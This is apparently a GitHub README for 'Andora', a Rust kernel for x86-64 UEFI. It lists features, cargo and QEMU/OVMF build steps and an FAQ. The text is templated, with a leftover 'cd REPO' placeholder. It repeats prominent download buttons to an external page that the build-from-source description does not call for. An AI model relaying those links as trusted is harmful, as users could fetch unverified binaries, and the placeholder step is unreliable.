# Andora - Operating System Kernel 2026

> **Andora is a freestanding Rust kernel for x86-64 UEFI systems, combining low-level memory and interrupt setup with a framebuffer console, virtual filesystems, and cooperative asynchronous tasks.**

[![Platform](https://img.shields.io/badge/Platform-x86--64%20UEFI-blue?style=flat-square)](https://github.com)
[![Language](https://img.shields.io/badge/Language-Rust-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/martinkaiser2/andora-rust-kernel?style=flat-square)](https://github.com/martinkaiser2/andora-rust-kernel)

---

<p align="center">
  <a href="https://martinkaiser2.github.io/andora-rust-kernel/">
    <img src="https://img.shields.io/badge/Download-Andora%20Latest-brightgreen?style=for-the-badge" alt="Download Andora">
  </a>
</p>

> **[Download Andora](https://martinkaiser2.github.io/andora-rust-kernel/)**

---

[Download Latest Build](https://martinkaiser2.github.io/andora-rust-kernel/)

---

## Project Overview

Written in Rust, Andora is a freestanding operating system kernel built around a `no_std` design. Its primary boot path is x86-64 UEFI, with QEMU and OVMF available for running the kernel in a virtual machine.

The project combines core platform initialization with a compact systems runtime. Its implementation covers physical memory handling, page tables, heap allocation, device input and output, asynchronous task processing, and filesystem infrastructure linking an initramfs with writable in-memory storage.

---

## Included Capabilities

- Freestanding kernel implementation in Rust
- UEFI boot support for x86-64 systems
- CPU startup and interrupt-table initialization
- Physical memory management and page-table configuration
- Heap allocation for kernel use
- Framebuffer console output with serial diagnostics
- PS/2 keyboard input handling
- Cooperative asynchronous task execution
- USTAR initramfs checking and import
- Writable filesystem stored in memory
- Mount-table-aware virtual filesystem
- File descriptors backed by the VFS
- Execution through QEMU with OVMF

---

## Getting Started

Fetch the source and switch into the repository:

```sh
git clone https://github.com/martinkaiser2/andora-rust-kernel.git
cd REPO
```

Use the project's Rust setup to compile the kernel:

```sh
cargo build
```

To run it in a virtual machine, configure QEMU together with OVMF and boot the generated UEFI image through the project's build or run process. The resulting image location can differ according to the Cargo target and local build settings.

---

## Running Andora

The usual development cycle consists of the following steps:

1. Install Rust along with the tooling needed for x86-64 and UEFI kernel work.
2. Compile the project with Cargo.
3. Boot the kernel in QEMU using OVMF as the UEFI firmware.
4. Watch the framebuffer for console messages.
5. Review early and low-level startup information through the serial output.
6. Supply an initramfs when exercising USTAR loading, VFS mounts, or file-descriptor functionality.
7. Test keyboard input and cooperative asynchronous tasks inside the running kernel.

For physical-machine testing, boot the prepared UEFI image from compatible x86-64 UEFI media. If available, use serial output to assist with diagnostics.

---

## Project Configuration

Build behavior comes from the Rust project files, target definition, boot-image layout, and the QEMU/OVMF parameters used for the current development setup.

For example, a local Cargo configuration could contain:

```toml
[build]
target = "x86-64-uefi-target.json"
```

Use the target filename and Cargo options that exist in this repository. Other runtime values, including the initramfs location, OVMF firmware path, guest memory, and serial device, are determined by the UEFI or QEMU launch configuration.

---

## Prerequisites

- An x86-64 development or testing environment
- A UEFI-capable boot path
- Rust
- Cargo
- QEMU for virtual machine execution
- OVMF to provide UEFI firmware under QEMU
- Optional access to serial output for diagnostics
- Enough memory for the kernel, heap, and in-memory filesystem activity

---

## Frequently Asked Questions

### What boot method does Andora use?

Andora is intended to launch through UEFI on x86-64 hardware.

### Is dedicated hardware required for testing?

No. The supported virtual testing setup uses QEMU together with OVMF.

### Where does diagnostic output appear?

In addition to the framebuffer console, the kernel emits serial diagnostics. Configure the serial output for the QEMU instance or hardware platform to view them.

### How does the kernel receive initial filesystem data?

Andora can verify and import a USTAR-formatted initramfs. Its contents can then be made available through the VFS and writable in-memory filesystem layers.

### Are asynchronous tasks supported?

Yes. The kernel provides cooperative asynchronous execution, so tasks can yield within its scheduling model.

### What can cause a failed startup?

Check the x86-64 target, UEFI image layout, OVMF firmware location, QEMU arguments, and serial-console configuration. For filesystem tests, also ensure that the initramfs is present and uses the expected format.

### Where are configuration changes made?

Inspect the Rust target definition, Cargo project configuration, and the QEMU/OVMF launch settings used by the local workflow. When booting on hardware, the UEFI environment controls the relevant boot settings.

### How are new builds and changes obtained?

Updates are published through the repository and its build location. After pulling new source changes, rebuild Andora and run the QEMU or UEFI boot process again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
